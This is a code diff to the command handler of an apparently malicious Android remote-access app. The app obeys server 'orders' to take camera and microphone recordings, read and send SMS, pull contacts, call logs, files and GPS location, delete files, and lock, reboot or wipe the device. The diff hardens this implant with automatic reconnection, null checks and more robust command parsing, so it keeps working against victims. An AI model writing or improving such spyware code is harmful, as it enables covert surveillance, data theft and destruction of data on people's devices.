@@ -5,6 +5,7 @@ import android.content.Context;
 import android.content.Intent;
 import android.net.Uri;
 import android.os.Build;
+import android.os.Handler;
 import android.os.Looper;
 import android.util.Log;
 
@@ -31,15 +32,35 @@ public class ConnectionManager {
     @SuppressLint("StaticFieldLeak")
     public static Context context;
     private static io.socket.client.Socket ioSocket;
+    private static final long RECONNECT_DELAY_MS = 3000;
+    private static int reconnectAttempts = 0;
+    private static final int MAX_RECONNECT_ATTEMPTS = 10;
 
     public static void startAsync(Context con) {
-        try {
-            context = con;
-            sendReq();
-        } catch (Exception ex) {
-            startAsync(con);
-        }
+        context = con;
+        reconnectAttempts = 0;
+        sendReqWithRetry();
+    }
 
+    private static void sendReqWithRetry() {
+        try {
+            ioSocket = null;
+            sendReq();
+            reconnectAttempts = 0;
+        } catch (Exception ex) {
+            Log.e("ConnectionManager", "Failed to connect: " + ex.getMessage());
+            if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
+                reconnectAttempts++;
+                // Linear backoff: 3s, 6s, 9s, ... up to 30s
+                long delay = Math.min(RECONNECT_DELAY_MS * reconnectAttempts, 30000);
+                new Handler(Looper.getMainLooper()).postDelayed(
+                        ConnectionManager::sendReqWithRetry,
+                        delay
+                );
+            } else {
+                Log.e("ConnectionManager", "Max reconnect attempts reached. Giving up.");
+            }
+        }
     }
 
 
@@ -56,41 +77,51 @@ public class ConnectionManager {
             ioSocket.on("ping", new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-                    ioSocket.emit("pong");
+                    if (ioSocket != null) {
+                        ioSocket.emit("pong");
+                    }
                 }
             });
 
             ioSocket.on("order", new Emitter.Listener() {
                 @Override
                 public void call(Object... args) {
-
                     try {
+                        if (args == null || args.length == 0 || !(args[0] instanceof JSONObject)) return;
                         JSONObject data = (JSONObject) args[0];
-                        String order = data.getString("order");
+                        String order = data.optString("order");
+                        if (order.isEmpty()) return;
 
                         Log.d("order", order);
 
                         switch (order) {
-                            case "x0000ca":
-                                if (data.getString("extra").equals("camList"))
+                            case "x0000ca": {
+                                String extra = data.optString("extra");
+                                if ("camList".equals(extra))
                                     x0000ca(-1);
-                                else if (data.getString("extra").equals("1"))
+                                else if ("1".equals(extra))
                                     x0000ca(1);
-                                else if (data.getString("extra").equals("0"))
+                                else if ("0".equals(extra))
                                     x0000ca(0);
                                 break;
-                            case "x0000fm":
-                                if (data.getString("extra").equals("ls"))
-                                    x0000fm(0, data.getString("path"));
-                                else if (data.getString("extra").equals("dl"))
-                                    x0000fm(1, data.getString("path"));
+                            }
+                            case "x0000fm": {
+                                String extra = data.optString("extra");
+                                String path = data.optString("path");
+                                if ("ls".equals(extra))
+                                    x0000fm(0, path);
+                                else if ("dl".equals(extra))
+                                    x0000fm(1, path);
                                 break;
-                            case "x0000sm":
-                                if (data.getString("extra").equals("ls"))
+                            }
+                            case "x0000sm": {
+                                String extra = data.optString("extra");
+                                if ("ls".equals(extra))
                                     x0000sm(0, null, null);
-                                else if (data.getString("extra").equals("sendSMS"))
-                                    x0000sm(1, data.getString("to"), data.getString("sms"));
+                                else if ("sendSMS".equals(extra))
+                                    x0000sm(1, data.optString("to"), data.optString("sms"));
                                 break;
+                            }
                             case "x0000cl":
                                 x0000cl();
                                 break;
@@ -98,7 +129,7 @@ public class ConnectionManager {
                                 x0000cn();
                                 break;
                             case "x0000mc":
-                                x0000mc(data.getInt("sec"));
+                                x0000mc(data.optInt("sec", 10));
                                 break;
                             case "x0000apps":
                                 x0000apps();
@@ -107,16 +138,16 @@ public class ConnectionManager {
                                 x0000lm();
                                 break;
                             case "x0000runApp":
-                                x0000runApp(data.getString("extra"));
+                                x0000runApp(data.optString("extra"));
                                 break;
                             case "x0000openUrl":
-                                x0000openUrl(data.getString("url"));
+                                x0000openUrl(data.optString("url"));
                                 break;
                             case "x0000deleteFF":
-                                x0000deleteFF(data.getString("fileFolderPath"));
+                                x0000deleteFF(data.optString("fileFolderPath"));
                                 break;
                             case "x0000dm":
-                                x0000dm(data.getString("number"));
+                                x0000dm(data.optString("number"));
                                 break;
                             case "x0000lockDevice":
                                 x0000lockDevice();
@@ -132,10 +163,25 @@ public class ConnectionManager {
                                 break;
                         }
                     } catch (Exception e) {
-                        e.printStackTrace();
+                        Log.e("ConnectionManager", "Error handling order: " + e.getMessage());
                     }
                 }
             });
+
+            ioSocket.on(io.socket.client.Socket.EVENT_CONNECT_ERROR, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.e("ConnectionManager", "Socket connection error");
+                }
+            });
+
+            ioSocket.on(io.socket.client.Socket.EVENT_DISCONNECT, new Emitter.Listener() {
+                @Override
+                public void call(Object... args) {
+                    Log.d("ConnectionManager", "Socket disconnected. Will reconnect automatically.");
+                }
+            });
+
             ioSocket.connect();
 
         } catch (Exception ex) {
@@ -146,7 +192,7 @@ public class ConnectionManager {
     private static void x0000rebootDevice() throws JSONException {
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
 
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                 MainActivity.devicePolicyManager.reboot(MainActivity.componentName);
@@ -169,7 +215,7 @@ public class ConnectionManager {
 
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
             MainActivity.devicePolicyManager.wipeData(1);
             jsonObject.put("status", true);
             jsonObject.put("message", "Device wiped out successfully.");
@@ -178,14 +224,14 @@ public class ConnectionManager {
             jsonObject.put("status", false);
             jsonObject.put("message", "Device admin permission is not active.");
         }
-        ioSocket.emit("x0000lockDevice", jsonObject);
+        ioSocket.emit("x0000wipeDevice", jsonObject);
     }
 
     private static void x0000lockDevice() throws JSONException {
 
         JSONObject jsonObject = new JSONObject();
 
-        if (MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
+        if (MainActivity.devicePolicyManager != null && MainActivity.devicePolicyManager.isAdminActive(MainActivity.componentName)){
             MainActivity.devicePolicyManager.lockNow();
             jsonObject.put("status", true);
             jsonObject.put("message", "Device locked.");
@@ -340,22 +386,31 @@ public class ConnectionManager {
         MicManager.startRecording(sec);
     }
 
-    public static void x0000lm() throws Exception {
-        Looper.prepare();
-        LocManager gps = new LocManager(context);
-        JSONObject location = new JSONObject();
-        // check if GPS enabled
-        if (gps.canGetLocation()) {
+    public static void x0000lm() {
+        try {
+            // Only prepare Looper if one doesn't already exist on this thread
+            if (Looper.myLooper() == null) {
+                Looper.prepare();
+            }
+            LocManager gps = new LocManager(context);
+            JSONObject location = new JSONObject();
+            // check if GPS enabled
+            if (gps.canGetLocation()) {
 
-            double latitude = gps.getLatitude();
-            double longitude = gps.getLongitude();
-            Log.e("loc", latitude + "   ,  " + longitude);
-            location.put("enable", true);
-            location.put("lat", latitude);
-            location.put("lng", longitude);
-        } else
-            location.put("enable", false);
+                double latitude = gps.getLatitude();
+                double longitude = gps.getLongitude();
+                Log.d("Location", latitude + "   ,  " + longitude);
+                location.put("enable", true);
+                location.put("lat", latitude);
+                location.put("lng", longitude);
+            } else
+                location.put("enable", false);
 
-        ioSocket.emit("x0000lm", location);
+            if (ioSocket != null) {
+                ioSocket.emit("x0000lm", location);
+            }
+        } catch (Exception e) {
+            Log.e("ConnectionManager", "Error getting location: " + e.getMessage());
+        }
     }
 }
